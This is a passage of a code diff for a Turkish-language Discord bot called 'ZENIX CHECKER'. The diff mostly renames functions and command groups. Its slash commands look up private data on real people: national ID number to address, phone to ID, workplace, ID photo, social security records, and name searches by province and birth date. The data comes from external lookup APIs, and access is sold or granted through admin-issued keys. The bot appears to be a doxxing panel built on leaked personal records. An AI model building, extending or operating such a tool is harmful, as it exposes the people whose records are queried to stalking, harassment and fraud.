 @app_commands.describe(tc="TC")
-async def z2_adres(interaction, tc: str):
+async def z2ad(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/adres/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="gsmtc", description="GSM → TC")
+@zg2.command(name="gsmtc", description="GSM → TC")
 @app_commands.describe(gsm="GSM")
-async def z2_gsmtc(interaction, gsm: str):
+async def z2g(interaction, gsm: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/gsmtc/{gsm}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="tcgsm", description="TC → GSM")
+@zg2.command(name="tcgsm", description="TC → GSM")
 @app_commands.describe(tc="TC")
-async def z2_tcgsm(interaction, tc: str):
+async def z2tg(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/tcgsm/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="isyeri", description="İşyeri")
+@zg2.command(name="isyeri", description="İşyeri")
 @app_commands.describe(tc="TC")
-async def z2_isyeri(interaction, tc: str):
+async def z2i(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SEARCHULP}/isyeri/{tc}?key={SEARCH_KEY}"))
 
-
-@zenix2_group.command(name="vesika", description="Vesika")
+@zg2.command(name="vesika", description="Vesika")
 @app_commands.describe(tc="TC")
-async def z2_vesika(interaction, tc: str):
+async def z2v(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/vesika.php?tc={tc}"))
 
-
-@zenix2_group.command(name="sgk", description="SGK")
+@zg2.command(name="sgk", description="SGK")
 @app_commands.describe(tc="TC")
-async def z2_sgk(interaction, tc: str):
+async def z2sg(interaction, tc: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/sgk.php?tc={tc}"))
 
-
-@zenix2_group.command(name="idsorgu", description="ID sorgu")
+@zg2.command(name="idsorgu", description="ID sorgu")
 @app_commands.describe(id="ID")
-async def z2_idsorgu(interaction, id: str):
+async def z2id(interaction, id: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{ID_API}?id={id}"))
 
-
-# ==================== /zenix3 — AD/SOYAD ====================
-@zenix3_group.command(name="adsoyad", description="Ad soyad arama")
+# ==================== /zenix3 ====================
+@zg3.command(name="adsoyad", description="Ad soyad arama")
 @app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe", dogumtarihi="Doğum")
-async def z3_adsoyad(interaction, ad: str, soyad: Optional[str] = None, il: Optional[str] = None, ilce: Optional[str] = None, dogumtarihi: Optional[str] = None):
+async def z3as(interaction, ad: str, soyad: Optional[str] = None, il: Optional[str] = None, ilce: Optional[str] = None, dogumtarihi: Optional[str] = None):
     if not await precheck(interaction): return
     await interaction.response.defer()
-    params = {"ad": ad, "key": SEARCH_KEY}
-    if soyad: params["soyad"] = soyad
-    if il: params["il"] = il
-    if ilce: params["ilce"] = ilce
-    if dogumtarihi: params["dogumtarihi"] = dogumtarihi
-    await send_result(interaction, await fetch_json(f"{SEARCHULP}/adsoyad?{urlencode(params)}"))
+    p = {"ad": ad, "key": SEARCH_KEY}
+    if soyad: p["soyad"] = soyad
+    if il: p["il"] = il
+    if ilce: p["ilce"] = ilce
+    if dogumtarihi: p["dogumtarihi"] = dogumtarihi
+    await send_result(interaction, await fetch_json(f"{SEARCHULP}/adsoyad?{urlencode(p)}"))
 
-
-@zenix3_group.command(name="adsoyadil", description="Ad soyad il ilçe")
+@zg3.command(name="adsoyadil", description="Ad soyad il ilçe")
 @app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe")
-async def z3_adsoyadil(interaction, ad: str, soyad: str, il: str, ilce: str):
+async def z3asi(interaction, ad: str, soyad: str, il: str, ilce: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/adsoyad.php?ad={ad}&soyad={soyad}&il={il}&ilce={ilce}"))
 
-
-@zenix3_group.command(name="adililce", description="Ad il ilçe")
+@zg3.command(name="adililce", description="Ad il ilçe")
 @app_commands.describe(ad="Ad", il="İl", ilce="İlçe")
-async def z3_adililce(interaction, ad: str, il: str, ilce: str):
+async def z3ai(interaction, ad: str, il: str, ilce: str):
     if not await precheck(interaction): return
     await interaction.response.defer()
     await send_result(interaction, await fetch_json(f"{SOLIDARK}/adililce.php?ad={ad}&il={il}&ilce={ilce}"))
-
 
 # ==================== GENEL ====================
 @bot.tree.command(name="ping", description="Ping")
 async def ping(interaction):
     await interaction.response.send_message(f"```\n{round(bot.latency * 1000)}ms\n```")
 
-
 @bot.tree.command(name="yardim", description="ZENIX komutlar")
 async def yardim(interaction):
     if interaction.guild is None:
         await interaction.response.send_message("❌ Sunucuda kullan.", ephemeral=True); return
-    g1 = [c.name for c in zenix_group.commands]
-    g2 = [c.name for c in zenix2_group.commands]
-    g3 = [c.name for c in zenix3_group.commands]
-    embed = discord.Embed(title="✨  ZENIX CHECKER  ✨",
-        description="🔎 Tüm komutlar\n━━━━━━━━━━━━━━━━━━━━━━━━━━",
-        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
-    embed.add_field(name="⚡ `/zenix`", value="`" + "` `".join(sorted(g1)) + "`", inline=False)
-    embed.add_field(name="🪪 `/zenix2`", value="`" + "` `".join(sorted(g2)) + "`", inline=False)
-    embed.add_field(name="👤 `/zenix3`", value="`" + "` `".join(sorted(g3)) + "`", inline=False)
-    embed.add_field(name="🔑 Anahtar", value="`/anahtargir`", inline=False)
-    embed.add_field(name="👑 Admin", value="`/anahtarolustur` `/anahtarsil` `/anahtarlistesi` `/sunucuekle` `/sunuculistesi` `/sunucusil`", inline=False)
-    embed.set_thumbnail(url=LOGO_URL)
-    embed.set_image(url=LOGO_URL)
-    await interaction.response.send_message(embed=embed)
-
+    g1 = [c.name for c in zg.commands]
+    g2 = [c.name for c in zg2.commands]
+    g3 = [c.name for c in zg3.commands]
+    e = discord.Embed(title="✨  ZENIX CHECKER  ✨", description="🔎 Tüm komutlar\n━━━━━━━━━━━━━━━━━━━━━━━━━━", color=COLOR_Z, timestamp=datetime.datetime.utcnow())
+    e.add_field(name="⚡ `/zenix`", value="`" + "` `".join(sorted(g1)) + "`", inline=False)
+    e.add_field(name="🪪 `/zenix2`", value="`" + "` `".join(sorted(g2)) + "`", inline=False)
+    e.add_field(name="👤 `/zenix3`", value="`" + "` `".join(sorted(g3)) + "`", inline=False)
+    e.add_field(name="🔑 Anahtar", value="`/anahtargir`", inline=False)
+    e.add_field(name="👑 Admin", value="`/anahtarolustur` `/anahtarsil` `/anahtarlistesi` `/sunucuekle` `/sunuculistesi` `/sunucusil`", inline=False)
+    e.set_thumbnail(url=LOGO_URL); e.set_image(url=LOGO_URL)
+    await interaction.response.send_message(embed=e)
 
 @bot.tree.command(name="hosgeldin", description="Hoş geldin")
 async def hosgeldin(interaction):
     await interaction.response.send_message(embed=build_welcome_embed())
 
-
 # ==================== KAYIT ====================
-bot.tree.add_command(zenix_group)
-bot.tree.add_command(zenix2_group)
-bot.tree.add_command(zenix3_group)
-
+bot.tree.add_command(zg)
+bot.tree.add_command(zg2)
+bot.tree.add_command(zg3)
 
 # ==================== ÇALIŞTIR ====================
 if __name__ == "__main__":
     if not DISCORD_TOKEN:
-        print("❌ DISCORD_TOKEN yok!")
-        exit(1)
+        print("❌ DISCORD_TOKEN yok!"); exit(1)
     print("🚀 ZENIX başlatılıyor...")
     bot.run(DISCORD_TOKEN)
